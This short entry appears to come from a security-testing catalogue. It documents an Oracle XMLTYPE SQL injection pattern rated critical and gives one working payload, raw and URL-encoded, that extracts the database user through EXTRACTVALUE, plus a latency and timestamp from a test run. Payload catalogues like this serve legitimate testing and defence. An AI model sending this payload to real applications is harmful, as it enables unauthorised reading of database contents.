Attack Pattern Information

NameOracle XMLTYPE Injection
CategorySQLI
Subcategoryxml_injection
SeverityCRITICAL

Attack Details

  • Payload: ' AND EXTRACTVALUE(XMLTYPE('<a>'||(SELECT user FROM dual)||'</a>'),'/a')='test'--
  • Encoded: '%20AND%20EXTRACTVALUE(XMLTYPE('%3Ca%3E'%7C%7C(SELECT%20user%20FROM%20dual)%7C%7C'%3C%2Fa%3E')%2C'%2Fa')%3D'test'--

Test Execution Results

  • Latency: ~28000ms
  • Timestamp: 20:31:42.000 UTC
